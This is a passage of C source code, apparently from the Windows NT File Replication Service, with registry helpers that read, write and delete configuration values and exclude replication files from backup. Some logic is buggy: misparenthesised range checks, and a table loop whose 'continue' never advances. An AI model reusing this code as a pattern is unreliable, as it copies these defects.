    if (!WIN_SUCCESS(WStatus)) {
        DPRINT1_WS(5, ":FK: RegQueryValueEx(%ws);", KeyCtx->ValueName, WStatus);
        Len = 0;
    }

    //
    // If the value is supposed to be there then return error to caller.
    //
    if ((Len == 0) &&
        BooleanFlagOn(Flags | KeyCtx->Flags, FRS_RKF_VALUE_MUST_BE_PRESENT)) {
        DPRINT2_WS(0, ":FK: Value not found  [%ws] \"%ws\".",
                   KeyCtx->KeyName, KeyCtx->ValueName, WStatus);
        FrsRegPostEventLog(KeyCtx, KeyArg1, Flags, IDS_REG_VALUE_NOT_FOUND);
        goto RETURN;
    }

    if (WIN_SUCCESS(WStatus)) {

        //
        // Should be a string.
        //
        if ((Type != REG_SZ) && (Type != REG_EXPAND_SZ)) {
            DPRINT4(0, ":FK: Invalid registry data type for [%ws] \"%ws\".  Found Type %d, Expecting Type %d\n",
                 KeyCtx->KeyName, KeyCtx->ValueName, Type, KeyCtx->RegValueType);
            WStatus = ERROR_INVALID_PARAMETER;
            FrsRegPostEventLog(KeyCtx, KeyArg1, Flags, IDS_REG_VALUE_WRONG_TYPE);
            goto CHECK_DEFAULT;
        }

        //
        // If the string is too long or too short then complain and use default.
        // If KeyCtx->ValueMax is zero then no maximum length check.
        //
        if (BooleanFlagOn(Flags | KeyCtx->Flags, FRS_RKF_RANGE_CHECK) &&
            (Len < KeyCtx->ValueMin*sizeof(WCHAR)) ||
            ((KeyCtx->ValueMax != 0) && (Len > KeyCtx->ValueMax*sizeof(WCHAR)))) {
            DPRINT4(0, ":FK: String size out of range for [%ws] \"%ws\".  Min: %d  Max: %d\n",
                    KeyCtx->KeyName, KeyCtx->ValueName, KeyCtx->ValueMin, KeyCtx->ValueMax);
            WStatus = ERROR_INVALID_PARAMETER;
            FrsRegPostEventLog(KeyCtx, KeyArg1, Flags, IDS_REG_VALUE_RANGE_ERROR);
            goto CHECK_DEFAULT;
        }

        //
        //  Alloc the return buffer and read the data.
        //
        Data = (PWCHAR) FrsAlloc (Len+1);
        WStatus = RegQueryValueEx(hKey, KeyCtx->ValueName, NULL, &Type, (PUCHAR)Data, &Len);

        if (!WIN_SUCCESS(WStatus)) {
            DPRINT2(0, ":FK: RegQueryValueEx(%ws); WStatus %s\n", KeyCtx->ValueName, ErrLabelW32(WStatus));
            Data = (PWCHAR) FrsFree(Data);
            goto RETURN;
        }
    }


CHECK_DEFAULT:

    if (!WIN_SUCCESS(WStatus) && DefaultValueUseOk) {
        //
        // Not found or wrong type but Ok to use the default value from key context.
        //
        Data = (PWCHAR) FrsFree(Data);
        if (KeyCtx->StringDefault == NULL) {
            DPRINT2(4, ":FK: Using internal default value for [%ws] \"%ws\" = NULL\n",
                    KeyCtx->KeyName, KeyCtx->ValueName);
            goto RETURN;
        }
        Type = KeyCtx->RegValueType;
        Data = FrsWcsDup(KeyCtx->StringDefault);

        WStatus = ERROR_SUCCESS;
        DPRINT3(4, ":FK: Using internal default value for [%ws] \"%ws\" = %ws\n",
                KeyCtx->KeyName, KeyCtx->ValueName, Data);
    }


    if (WIN_SUCCESS(WStatus) && (Data != NULL)) {
        //
        // Perform syntax check based on data type in KeyCtx->DataValueType?
        //
        if (BooleanFlagOn(Flags | KeyCtx->Flags, FRS_RKF_SYNTAX_CHECK)) {
            NOTHING;
        }

        DPRINT3(4, ":FK:   [%ws] \"%ws\" = \"%ws\"\n",
                KeyCtx->KeyName, KeyCtx->ValueName, Data);

        //
        // Expand system strings if needed
        //
        if (Type == REG_EXPAND_SZ) {

            NewLen = ExpandEnvironmentStrings(Data, TStr, 0);

            while (TRUE) {
                NewData = (PWCHAR) FrsAlloc ((NewLen+1) * sizeof(WCHAR));

                Len = ExpandEnvironmentStrings(Data, NewData, NewLen);
                if (Len == 0) {
                    WStatus = GetLastError();
                    DPRINT2_WS(5, ":FK: [%ws] \"%ws\" Param not expanded.",
                               KeyCtx->KeyName, KeyCtx->ValueName, WStatus);
                    Data = FrsFree(Data);
                    NewData = FrsFree(NewData);
                    break;
                }

                if (Len <= NewLen) {
                    //
                    // Free the original buffer and set to return expanded string.
                    //
                    FrsFree(Data);
                    Data = NewData;
                    Len = NewLen;
                    WStatus = ERROR_SUCCESS;
                    break;
                }

                //
                // Get a bigger buffer.
                //
                NewData = (PWCHAR) FrsFree(NewData);
                NewLen = Len;
            }
        }


        //
        //  Return ptr to buffer and save a copy for debug printouts.
        //
        *pStrRet = Data;

        DPRINT3(3, ":FK:   [%ws] \"%ws\" = \"%ws\"\n",
                KeyCtx->KeyName, KeyCtx->ValueName,
                (Data != NULL) ? Data : L"<null>");
    }

    //
    //  Close the handle if one was opened.
    //
RETURN:


    if (hKey != HKEY_LOCAL_MACHINE) {
        FRS_REG_CLOSE(hKey);
    }

    return WStatus;
}

#if 0
// multisz example)
void
RegQueryMULTISZ(
    HKEY  hkey,
    LPSTR szSubKey,
    LPSTR szValue
    )

/*++

Routine Description:

    This function queries MULTISZ value in the registry using the
    hkey and szSubKey as the registry key info.  If the value is not
    found in the registry, it is added with a zero value.

Arguments:

    hkey          - handle to a registry key
    szSubKey      - pointer to a subkey string

Return Value:

    registry value

--*/

{
    DWORD   rc;
    DWORD   len;
    DWORD   dwType;
    char    buf[1024];

    len = sizeof(buf);
    rc = RegQueryValueEx( hkey, szSubKey, 0, &dwType, (LPBYTE)buf, &len );
    if (!WIN_SUCCESS(rc)) {
        if (rc == ERROR_FILE_NOT_FOUND) {
            buf[0] = 0;
            buf[1] = 0;
            len = 2;
            RegSetMULTISZ( hkey, szSubKey, buf );
        }
    }

    CopyMemory( szValue, buf, len );
}
#endif



DWORD
CfgRegWriteDWord(
    IN  FRS_REG_KEY_CODE KeyIndex,
    IN  PWCHAR           KeyArg1,
    IN  ULONG            Flags,
    IN  ULONG            NewData
)
{
/*++

Routine Description:

    This function reads a keyword value from the registry.

Arguments:

    KeyIndex   - An entry from the FRS_REG_KEY_CODE enum

    KeyArg1 - An optional caller supplied key component.  NULL if not provided.

    Flags - Modifer flags
        FRS_RKF_FORCE_DEFAULT_VALUE - if set then ignore NewData and write the
        default key value from the keyCtx into the registry.

    NewData -  DWORD to write to registry.

Return Value:

    Win32 status of the result of the registry operation.

--*/
#undef DEBSUB
#define  DEBSUB  "CfgRegWriteDWord:"


    DWORD   WStatus;
    HKEY    hKey = INVALID_HANDLE_VALUE;
    DWORD   Len;
    PFRS_REGISTRY_KEY KeyCtx;

//DPRINT(0, "function entry\n");
    //
    // Find the key context assoicated with the supplied index.
    //
    KeyCtx = FrsRegFindKeyContext(KeyIndex);
    if (KeyCtx == NULL) {
        DPRINT1(0, ":FK: ERROR - Key contxt not found for key code number %d\n", KeyIndex);
        return ERROR_INVALID_PARAMETER;
    }

    FRS_ASSERT(KeyCtx->ValueName != NULL);


    //
    // Table entry better be REG_DWORD.
    //
    if  (KeyCtx->RegValueType != REG_DWORD) {
        DPRINT3(0, ":FK: Mismatch on KeyCtx->RegValueType for [%ws] \"%ws\".  Expected REG_DWORD, Found type: %d\n",
             KeyCtx->KeyName, KeyCtx->ValueName, KeyCtx->RegValueType);
        FRS_ASSERT(!"Mismatch on KeyCtx->RegValueType, Expected REG_DWORD");
        return ERROR_INVALID_PARAMETER;
    }


    //
    // Open the key.
    //
    WStatus = FrsRegOpenKey(KeyCtx, KeyArg1, Flags, &hKey);

    if (!WIN_SUCCESS(WStatus)) {
        goto RETURN;
    }

    //
    // Keep existing value if caller says so.
    //
    if (BooleanFlagOn(Flags, FRS_RKF_KEEP_EXISTING_VALUE)) {
        WStatus = RegQueryValueEx(hKey, KeyCtx->ValueName, NULL, NULL, NULL, NULL);
        if (WIN_SUCCESS(WStatus)) {
            DPRINT2(4, ":FK: Retaining existing value for parameter [%ws] \"%ws\"\n",
                    KeyCtx->KeyName, KeyCtx->ValueName);
            goto RETURN;
        }
    }

    //
    // Check if we are writing the default value to the registry.
    //
    if (BooleanFlagOn(Flags, FRS_RKF_FORCE_DEFAULT_VALUE)) {

        NewData = KeyCtx->ValueDefault;
        DPRINT1(4, ":FK: Using internal default value = %d\n", NewData);
    }

    //
    // Perform Range check?    (Applies to default value too)
    //
    if (BooleanFlagOn(Flags | KeyCtx->Flags,
                      FRS_RKF_RANGE_CHECK | FRS_RKF_RANGE_SATURATE)) {

        if ((NewData < KeyCtx->ValueMin) || ( NewData > KeyCtx->ValueMax)) {

            DPRINT5(0, ":FK: Value out of range for [%ws] \"%ws\".  Found %d, must be between %d and %d\n",
                    KeyCtx->KeyName, KeyCtx->ValueName, NewData,
                    KeyCtx->ValueMin, KeyCtx->ValueMax);


            if (!BooleanFlagOn(Flags | KeyCtx->Flags, FRS_RKF_RANGE_SATURATE)) {
                WStatus = ERROR_INVALID_PARAMETER;
                FrsRegPostEventLog(KeyCtx, KeyArg1, Flags, IDS_REG_VALUE_RANGE_ERROR);
                goto RETURN;
            }

            //
            // Set the value to either the min or max of the allowed range.
            // WARNING:  The only current use of this flag is in setting the
            // DS polling interval.  This flag should be used with caution
            // since if a user miss-specifies a parameter and we jam
            // it to the min or max value the resulting effect could be
            // VERY UNDESIREABLE.
            //
            if (NewData < KeyCtx->ValueMin) {
                DPRINT2(4, ":FK: Value (%d) below of range.  Using Min value (%d)\n",
                        NewData, KeyCtx->ValueMin);
                NewData = KeyCtx->ValueMin;
            } else

            if (NewData > KeyCtx->ValueMax) {
                DPRINT2(4, ":FK: Value (%d) above of range.  Using Max value (%d)\n",
                        NewData, KeyCtx->ValueMax);
                NewData = KeyCtx->ValueMax;
            }

        }
    }

    //
    // Write the value and save it.
    //
    Len = sizeof(NewData);
    WStatus = RegSetValueEx(hKey, KeyCtx->ValueName, 0, REG_DWORD, (PCHAR)&NewData, Len);

    if (!WIN_SUCCESS(WStatus)) {
        DPRINT_WS(0, ":FK: ERROR - RegSetValueEx Failed.", WStatus);
    } else {
        DPRINT3(3, ":FK:   [%ws] \"%ws\" = %d\n",
                KeyCtx->KeyName, KeyCtx->ValueName, NewData);
    }


RETURN:

    if (hKey != HKEY_LOCAL_MACHINE) {
        FRS_REG_CLOSE(hKey);
    }

    return WStatus;

}



DWORD
CfgRegWriteString(
    IN  FRS_REG_KEY_CODE KeyIndex,
    IN  PWCHAR           KeyArg1,
    IN  ULONG            Flags,
    IN  PWSTR            NewStr
)
{
/*++

Routine Description:

    This function reads a keyword string value from the registry.  The return
    buffer is allocated here with FrsAlloc().  Caller must free.

Arguments:

    KeyIndex   - An entry from the FRS_REG_KEY_CODE enum

    KeyArg1 - An optional caller supplied key component.  NULL if not provided.

    Flags - Modifer flags
        FRS_RKF_FORCE_DEFAULT_VALUE - if set then ignore NewStr and write the
        default key value from the keyCtx into the registry.

    NewStr - ptr to buffer for new string data.


Return Value:

    Win32 status of the result of the registry operation.

--*/
#undef DEBSUB
#define  DEBSUB  "CfgRegWriteString:"

    DWORD   WStatus;
    HKEY    hKey = INVALID_HANDLE_VALUE;
    DWORD   Type;
    DWORD   Len, NewLen;
    PFRS_REGISTRY_KEY KeyCtx;

    // add support or new func for REG_MULTI_SZ

//DPRINT(0, "function entry\n");

    //
    // Find the key context assoicated with the supplied index.
    //
    KeyCtx = FrsRegFindKeyContext(KeyIndex);
    if (KeyCtx == NULL) {
        DPRINT1(0, ":FK: ERROR - Key contxt not found for key code number %d\n", KeyIndex);
        return ERROR_INVALID_PARAMETER;
    }


    //
    // Table entry better be some kind of string.
    //
    if  ((KeyCtx->RegValueType != REG_SZ) &&
      // (KeyCtx->RegValueType != REG_MULTI_SZ) &&
         (KeyCtx->RegValueType != REG_EXPAND_SZ)) {
        DPRINT3(0, ":FK: Mismatch on KeyCtx->RegValueType for [%ws] \"%ws\".  Expected REG_SZ or REG_EXPAND_SZ, Found type: %d\n",
             KeyCtx->KeyName, KeyCtx->ValueName, KeyCtx->RegValueType);
        FRS_ASSERT(!"Mismatch on KeyCtx->RegValueType, Expected REG_SZ or REG_EXPAND_SZ");
        return ERROR_INVALID_PARAMETER;
    }

    //
    // Open the key.
    //
    WStatus = FrsRegOpenKey(KeyCtx, KeyArg1, Flags, &hKey);
    if (!WIN_SUCCESS(WStatus)) {
        goto RETURN;
    }

    FRS_ASSERT(KeyCtx->ValueName != NULL);

    //
    // Keep existing value if caller says so.
    //
    if (BooleanFlagOn(Flags, FRS_RKF_KEEP_EXISTING_VALUE)) {
        WStatus = RegQueryValueEx(hKey, KeyCtx->ValueName, NULL, NULL, NULL, NULL);
        if (WIN_SUCCESS(WStatus)) {
            DPRINT2(4, ":FK: Retaining existing value for parameter [%ws] \"%ws\"\n",
                    KeyCtx->KeyName, KeyCtx->ValueName);
            goto RETURN;
        }
    }

    //
    // Check if we are writing the default value to the registry.
    //
    if (BooleanFlagOn(Flags, FRS_RKF_FORCE_DEFAULT_VALUE)) {
        if (KeyCtx->StringDefault == NULL) {
            DPRINT2(0, ":FK: ERROR - Key contxt has no default value for [%ws] \"%ws\" \n",
                    KeyCtx->KeyName, KeyCtx->ValueName);
            WStatus = ERROR_INVALID_PARAMETER;
            FRS_ASSERT(!"Key contxt has no default value");
            goto RETURN;
        }

        NewStr = KeyCtx->StringDefault;
        DPRINT1(4, ":FK: Using internal default value = \"%ws\" \n", NewStr);
    }

    //
    // Perform Range check?    (Applies to default value too)
    // If the string is too long or too short then complain and use default.
    // If KeyCtx->ValueMax is zero then no maximum length check.
    //
    // Note: for REG_MULTI_SZ we need to look for double null at end of str
    //       or use a unique symbol for the string separator and cvt to \0 before write.

    Len = (wcslen(NewStr) + 1) * sizeof(WCHAR);
    if (BooleanFlagOn(Flags | KeyCtx->Flags, FRS_RKF_RANGE_CHECK) &&
        (Len < KeyCtx->ValueMin*sizeof(WCHAR)) ||
        ((KeyCtx->ValueMax != 0) && (Len > KeyCtx->ValueMax*sizeof(WCHAR)))) {
        DPRINT4(0, ":FK: String size out of range for [%ws] \"%ws\".  Min: %d  Max: %d\n",
                KeyCtx->KeyName, KeyCtx->ValueName, KeyCtx->ValueMin, KeyCtx->ValueMax);
        WStatus = ERROR_INVALID_PARAMETER;
        FrsRegPostEventLog(KeyCtx, KeyArg1, Flags, IDS_REG_VALUE_RANGE_ERROR);
        goto RETURN;
    }

    WStatus = RegSetValueEx(hKey,
                            KeyCtx->ValueName,
                            0,
                            KeyCtx->RegValueType,
                            (PCHAR)NewStr,
                            Len);

    if (!WIN_SUCCESS(WStatus)) {
        DPRINT_WS(0, ":FK: ERROR - RegSetValueEx Failed.", WStatus);
    } else {

        // note: won't work for MULTI_SZ
        DPRINT3(3, ":FK:   [%ws] \"%ws\" = %ws\n",
                KeyCtx->KeyName, KeyCtx->ValueName,
                (NewStr != NULL) ? NewStr : L"<null>");
    }

#if 0
    // Multi_Sz example
    //
    // Event Message File
    //
//    WStatus = RegSetValueEx(FrsEventLogKey,
//                            L"Sources",
//                            0,
//                            REG_MULTI_SZ,
//                            (PCHAR)(SERVICE_NAME L"\0"
//                                    SERVICE_LONG_NAME L"\0"),
//                            (wcslen(SERVICE_NAME) +
//                             wcslen(SERVICE_LONG_NAME) +
//                             3) * sizeof(WCHAR));
    //
    // Another example
    //
    void
RegSetMULTISZ(
    HKEY hkey,
    LPSTR szSubKey,
    LPSTR szValue
    )

/*++

Routine Description:

    This function changes a Multi_SZ value in the registry using the
    hkey and szSubKey as the registry key info.

Arguments:

    hkey          - handle to a registry key
    szSubKey      - pointer to a subkey string
    szValue       - new registry value

Return Value:

    None.

--*/

{
    ULONG i = 1;
    ULONG j = 0;
    LPSTR p = szValue;
    while( TRUE ) {
        j = strlen( p ) + 1;
        i += j;
        p += j;
        if (!*p) {
            break;
        }
    }
    RegSetValueEx( hkey, szSubKey, 0, REG_MULTI_SZ, (PUCHAR)szValue, i );
}

#endif


    //
    //  Close the handle if one was opened.
    //
RETURN:

    if (hKey != HKEY_LOCAL_MACHINE) {
        FRS_REG_CLOSE(hKey);
    }

    return WStatus;
}





DWORD
CfgRegDeleteValue(
    IN  FRS_REG_KEY_CODE KeyIndex,
    IN  PWCHAR           KeyArg1,
    IN  ULONG            Flags
)
{
/*++

Routine Description:

    This function deletes a keyword value from the registry.

Arguments:

    KeyIndex   - An entry from the FRS_REG_KEY_CODE enum

    KeyArg1 - An optional caller supplied key component.  NULL if not provided.

    Flags - Modifer flags


Return Value:

    Win32 status of the result of the registry operation.

--*/
#undef DEBSUB
#define  DEBSUB  "CfgRegDeleteValue:"


    DWORD   WStatus;
    HKEY    hKey = INVALID_HANDLE_VALUE;
    PFRS_REGISTRY_KEY KeyCtx;

//DPRINT(0, "function entry\n");
    //
    // Find the key context assoicated with the supplied index.
    //
    KeyCtx = FrsRegFindKeyContext(KeyIndex);
    if (KeyCtx == NULL) {
        DPRINT1(0, ":FK: ERROR - Key contxt not found for key code number %d\n", KeyIndex);
        return ERROR_INVALID_PARAMETER;
    }


    FRS_ASSERT(KeyCtx->ValueName != NULL);

    //
    // Open the key.
    //
    WStatus = FrsRegOpenKey(KeyCtx, KeyArg1, Flags, &hKey);
    if (!WIN_SUCCESS(WStatus)) {
        goto RETURN;
    }


    DPRINT2(3, ":FK: Deleting parameter [%ws] \"%ws\" \n",
            KeyCtx->KeyName, KeyCtx->ValueName);

    //
    // Delete the value.
    //
    WStatus = RegDeleteValue(hKey, KeyCtx->ValueName);
    DPRINT2_WS(0, ":FK: WARN - Cannot delete key for [%ws] \"%ws\";",
               KeyCtx->KeyName, KeyCtx->ValueName, WStatus);


RETURN:

    if (hKey != HKEY_LOCAL_MACHINE) {
        FRS_REG_CLOSE(hKey);
    }

    return WStatus;

}





DWORD
CfgRegOpenKey(
    IN  FRS_REG_KEY_CODE KeyIndex,
    IN  PWCHAR           KeyArg1,
    IN  ULONG            Flags,
    OUT HKEY             *RethKey
)
{
/*++

Routine Description:

    This function Opens the key associated with the entry from the FRS registry
    key context table.  It performs the normal substitution, key component
    creation, etc.

Arguments:

    KeyIndex   - An entry from the FRS_REG_KEY_CODE enum

    KeyArg1 - An optional caller supplied key component.  NULL if not provided.

    Flags - Modifer flags

    RethKey -- ptr to HKEY to return the key handle.   Caller must close the
               key with RegCloseKey().


Return Value:

    Win32 status of the result of the registry operation.

--*/
#undef DEBSUB
#define  DEBSUB  "CfgRegOpenKey:"


    DWORD   WStatus;
    HKEY    hKey = INVALID_HANDLE_VALUE;
    PFRS_REGISTRY_KEY KeyCtx;


//DPRINT(0, "function entry\n");
    FRS_ASSERT(RethKey != NULL);

    *RethKey =  INVALID_HANDLE_VALUE;

    //
    // Find the key context assoicated with the supplied index.
    //
    KeyCtx = FrsRegFindKeyContext(KeyIndex);
    if (KeyCtx == NULL) {
        DPRINT1(0, ":FK: ERROR - Key contxt not found for key code number %d\n", KeyIndex);
        return ERROR_INVALID_PARAMETER;
    }


    //
    // Open the key.
    //
    WStatus = FrsRegOpenKey(KeyCtx, KeyArg1, Flags, &hKey);
    if (!WIN_SUCCESS(WStatus)) {
        return WStatus;
    }


    DPRINT1(4, ":FK: Registry key opened [%ws]\n", KeyCtx->KeyName);


    *RethKey =  hKey;

    return ERROR_SUCCESS;

}



DWORD
CfgRegCheckEnable(
    IN  FRS_REG_KEY_CODE KeyIndex,
    IN  PWCHAR           KeyArg1,
    IN  ULONG            Flags,
    OUT PBOOL            Enabled,
    OUT PBOOL            EnabledAndRequired
)
/*++

Routine Description:

    This function Opens the key associated with the entry from the FRS registry
    key context table.  It performs the normal substitution, key component
    creation, etc.  It then checks to see if the data value is "Enabled"
    or "Disabled" and returns the boolean result.

Arguments:

    KeyIndex   - An entry from the FRS_REG_KEY_CODE enum

    KeyArg1 - An optional caller supplied key component.  NULL if not provided.

    Flags - Modifer flags

    Enabled -- ptr to BOOL to return the Enable / Disable state of the key.

    EnabledAndRequired -- ptr to BOOL to return TRUE if the state is
                         "Enabled and Required", FALSE otherwise


Return Value:

    Win32 status of the result of the registry operation.

--*/
#undef DEBSUB
#define  DEBSUB  "CfgRegCheckEnable:"
{

    ULONG WStatus;
    PWCHAR WStr = NULL;

//DPRINT(0, "function entry\n");

    WStatus = CfgRegReadString(KeyIndex, KeyArg1, Flags, &WStr);

    if ((WStr == NULL) ||
        WSTR_EQ(WStr, FRS_IS_DEFAULT_DISABLED)||
        WSTR_EQ(WStr, FRS_IS_DEFAULT_ENABLED) ||
        WSTR_EQ(WStr, FRS_IS_DEFAULT_ENABLED_AND_REQUIRED)
        ) {
        //
        // The key is in the default state so we can clobber it with a
        // new default.
        //
        WStatus = CfgRegWriteString(KeyIndex,
                                    KeyArg1,
                                    FRS_RKF_FORCE_DEFAULT_VALUE,
                                    NULL);
        DPRINT1_WS(0, ":FK: WARN - Cannot create Enable key [%ws];",
                    CfgRegGetValueName(KeyIndex), WStatus);

        //
        // Now reread the key for the new default.
        //
        WStr = FrsFree(WStr);
        WStatus = CfgRegReadString(KeyIndex, KeyArg1, Flags, &WStr);
    }

    if ((WStr != NULL) &&
        (WSTR_EQ(WStr, FRS_IS_ENABLED) ||
         WSTR_EQ(WStr, FRS_IS_DEFAULT_ENABLED))) {
         *Enabled = TRUE;
         *EnabledAndRequired = FALSE;
         DPRINT1(4, ":FK: %ws is enabled\n", CfgRegGetValueName(KeyIndex));
    } else if ((WStr != NULL) &&
        (WSTR_EQ(WStr, FRS_IS_ENABLED_AND_REQUIRED) ||
         WSTR_EQ(WStr, FRS_IS_DEFAULT_ENABLED_AND_REQUIRED))) {
        *Enabled = TRUE;
        *EnabledAndRequired = TRUE;
    } else {
        *Enabled = FALSE;
        *EnabledAndRequired = FALSE;
        DPRINT1_WS(0, ":FK: WARN - %ws is not enabled.",
                   CfgRegGetValueName(KeyIndex), WStatus);
    }

    WStr = FrsFree(WStr);

    return WStatus;

}



BOOL
IsWin2KPro (
    VOID
)
/*++

Routine Description:

    Check OS version for Win 2000 Professional (aka NT Workstation).

Arguments:

    None.

Return Value:

    True if running on win 2K professional.

--*/
#undef DEBSUB
#define  DEBSUB  "IsWin2KPro:"
{
    OSVERSIONINFOEX Osvi;
    DWORDLONG       ConditionMask = 0;

    //
    // Initialize the OSVERSIONINFOEX structure.
    //
    ZeroMemory(&Osvi, sizeof(OSVERSIONINFOEX));
    Osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
    Osvi.dwMajorVersion = 5;
    Osvi.wProductType   = VER_NT_WORKSTATION;

    //
    // Initialize the condition mask.
    //
    VER_SET_CONDITION( ConditionMask, VER_MAJORVERSION, VER_GREATER_EQUAL );
    VER_SET_CONDITION( ConditionMask, VER_PRODUCT_TYPE, VER_EQUAL );

    //
    // Perform the test.
    //
    return VerifyVersionInfo(&Osvi, VER_MAJORVERSION | VER_PRODUCT_TYPE, ConditionMask);
}



VOID
CfgRegAdjustTuningDefaults(
    VOID
    )
/*++

Routine Description:

    This function walks thru the FrsRegKeyRevisionTable and applies new
    min, max and default values to the specified keys.  The objective is
    to reduce the footprint of FRS on the workstation.

Arguments:

    None.

Return Value:

    None.

--*/
#undef DEBSUB
#define  DEBSUB  "CfgRegAdjustTuningDefaults:"
{

    PFRS_REG_KEY_REVISIONS  Rev;
    PFRS_REGISTRY_KEY      KeyCtx;

    Win2kPro = IsWin2KPro();

    if (!Win2kPro) {
        //
        // Only adjust tunables on a workstation.
        //
        return;
    }

    Rev = FrsRegKeyRevisionTable;

    while (Rev->FrsKeyCode != FKC_END_OF_TABLE) {

        KeyCtx = FrsRegFindKeyContext(Rev->FrsKeyCode);
        if (KeyCtx == NULL) {
            DPRINT1(0, ":FK: ERROR - Key contxt not found for key code number %d\n",
                    Rev->FrsKeyCode);
            continue;
        }

        //
        // Table entry better be REG_DWORD.
        //
        if  (KeyCtx->RegValueType != REG_DWORD) {
            DPRINT3(0, ":FK: Mismatch on KeyCtx->RegValueType for [%ws] \"%ws\".  Expected REG_DWORD, Found type: %d\n",
                 KeyCtx->KeyName, KeyCtx->ValueName, KeyCtx->RegValueType);
            continue;
        }

        //
        // Apply the new range and default values from the table.
        //
        KeyCtx->ValueMin = Rev->ValueMin;
        KeyCtx->ValueMax = Rev->ValueMax;
        KeyCtx->ValueDefault = Rev->ValueDefault;

        Rev += 1;
    }
}



#define BACKUP_STAR     L"*"
#define BACKUP_APPEND   L"\\* /s"
VOID
CfgFilesNotToBackup(
    IN PGEN_TABLE   Replicas
    )
/*++

Routine Description:

    Set the backup registry key to prevent backing up the jet
    database, staging directories, preinstall directories, ...

    Set the restore registry key KeysNotToRestore so that
    NtBackup will retain the ntfrs restore keys by moving
    them into the final restored registry.

Arguments:

    Table of replicas

Return Value:

    None.

--*/
{
#undef DEBSUB
#define DEBSUB "CfgFilesNotToBackup:"
    DWORD       WStatus;
    PVOID       Key;
    PREPLICA    Replica;
    PWCHAR      MStr = NULL;
    DWORD       Size = 0;
    DWORD       Idx = 0;
    HKEY        HOldBackupKey     = INVALID_HANDLE_VALUE;
    HKEY        HNewBackupKey     = INVALID_HANDLE_VALUE;
    HKEY        HKeysNotToRestore = INVALID_HANDLE_VALUE;

//DPRINT(0, "function entry\n");
    //
    // "<Jetpath>\* /s"
    //
    FrsAddToMultiString(JetPath, &Size, &Idx, &MStr);
    FrsCatToMultiString(BACKUP_APPEND, &Size, &Idx, &MStr);

    //
    // "<DebugInfo.LogFile>\NtFrs*"  Default: "%SystemRoot%\debug\NtFrs*"
    //
    FrsAddToMultiString(DebugInfo.LogFile, &Size, &Idx, &MStr);
    FrsCatToMultiString(NTFRS_DBG_LOG_FILE, &Size, &Idx, &MStr);
    FrsCatToMultiString(BACKUP_STAR, &Size, &Idx, &MStr);

    GTabLockTable(Replicas);
    Key = NULL;
    while (Replica = GTabNextDatumNoLock(Replicas, &Key)) {
        //
        // Ignore tombstoned sets
        //
        if (!IS_TIME_ZERO(Replica->MembershipExpires)) {
            continue;
        }

        //
        // Preinstall directories
        //
        if (Replica->Root) {
            FrsAddToMultiString(Replica->Root, &Size, &Idx, &MStr);
            FrsCatToMultiString(L"\\",         &Size, &Idx, &MStr);
            FrsCatToMultiString(NTFRS_PREINSTALL_DIRECTORY, &Size, &Idx, &MStr);
            FrsCatToMultiString(BACKUP_APPEND, &Size, &Idx, &MStr);
        }
        //
        // Preexisting directories
        //
        if (Replica->Root) {
            FrsAddToMultiString(Replica->Root, &Size, &Idx, &MStr);
            FrsCatToMultiString(L"\\",         &Size, &Idx, &MStr);
            FrsCatToMultiString(NTFRS_PREEXISTING_DIRECTORY, &Size, &Idx, &MStr);
            FrsCatToMultiString(BACKUP_APPEND, &Size, &Idx, &MStr);
        }
        //
        // Staging directories
        //
        if (Replica->Stage) {
            FrsAddToMultiString(Replica->Stage, &Size, &Idx, &MStr);
            FrsCatToMultiString(L"\\",          &Size, &Idx, &MStr);
            FrsCatToMultiString(GENERIC_PREFIX, &Size, &Idx, &MStr);
            FrsCatToMultiString(BACKUP_STAR,    &Size, &Idx, &MStr);
        }
    }
    GTabUnLockTable(Replicas);

    // Note: remove old_files_not_to_backup once existance of new key
    //       has been verified.
    //
    // FilesNotToBackup
    // "SOFTWARE\Microsoft\Windows NT\CurrentVersion\FilesNotToBackup"
    //
    WStatus = RegOpenKeyEx(HKEY_LOCAL_MACHINE,
                           FRS_OLD_FILES_NOT_TO_BACKUP,
                           0,
                           KEY_SET_VALUE,
                           &HOldBackupKey);
    CLEANUP1_WS(4, ":FK: WARN - RegOpenKeyEx(%ws);",
                FRS_OLD_FILES_NOT_TO_BACKUP, WStatus, NEW_FILES_NOT_TO_BACKUP);

    //
    // Set the ntfrs multistring value
    //
    WStatus = RegSetValueEx(HOldBackupKey,
                            SERVICE_NAME,
                            0,
                            REG_MULTI_SZ,
                            (PCHAR)MStr,
                            (Idx + 1) * sizeof(WCHAR));
    CLEANUP2_WS(4, ":FK: ERROR - RegSetValueEx(%ws\\%ws);",
                FRS_OLD_FILES_NOT_TO_BACKUP, SERVICE_NAME, WStatus, NEW_FILES_NOT_TO_BACKUP);

NEW_FILES_NOT_TO_BACKUP:
    //
    // FilesNotToBackup
    //  "SYSTEM\CurrentControlSet\Control\BackupRestore\FilesNotToBackup"
    //
    WStatus = RegOpenKeyEx(HKEY_LOCAL_MACHINE,
                           FRS_NEW_FILES_NOT_TO_BACKUP,
                           0,
                           KEY_SET_VALUE,
                           &HNewBackupKey);
    CLEANUP1_WS(4, ":FK: WARN - RegOpenKeyEx(%ws);",
                FRS_NEW_FILES_NOT_TO_BACKUP, WStatus, CLEANUP);

    //
    // Set the ntfrs multistring value
    //
    WStatus = RegSetValueEx(HNewBackupKey,
                            SERVICE_NAME,
                            0,
                            REG_MULTI_SZ,
                            (PCHAR)MStr,
                            (Idx + 1) * sizeof(WCHAR));
    CLEANUP2_WS(4, ":FK: ERROR - RegSetValueEx(%ws\\%ws);",
                FRS_NEW_FILES_NOT_TO_BACKUP, SERVICE_NAME, WStatus, CLEANUP);

    //
    // KeysNotToRestore
    //
    // Set the restore registry key KeysNotToRestore so that NtBackup will
    // retain the ntfrs restore keys by moving them into the final restored
    // registry.
    //
    //  CurrentControlSet\Services\<SERVICE_NAME>\Parameters\Backup/Restore\Process at Startup\"
    //

    MStr = FrsFree(MStr);
    Size = 0;
    Idx = 0;
    FrsAddToMultiString(FRS_VALUE_FOR_KEYS_NOT_TO_RESTORE, &Size, &Idx, &MStr);

    //
    // KeysNotToRestore
    // "SYSTEM\CurrentControlSet\Control\BackupRestore\KeysNotToRestore"
    //
    WStatus = RegOpenKeyEx(HKEY_LOCAL_MACHINE,
                           FRS_KEYS_NOT_TO_RESTORE,
                           0,
                           KEY_SET_VALUE,
                           &HKeysNotToRestore);
    CLEANUP1_WS(4, ":FK: WARN - RegOpenKeyEx(%ws);",
                FRS_KEYS_NOT_TO_RESTORE, WStatus, CLEANUP);

    //
    // Set the ntfrs multistring value
    //
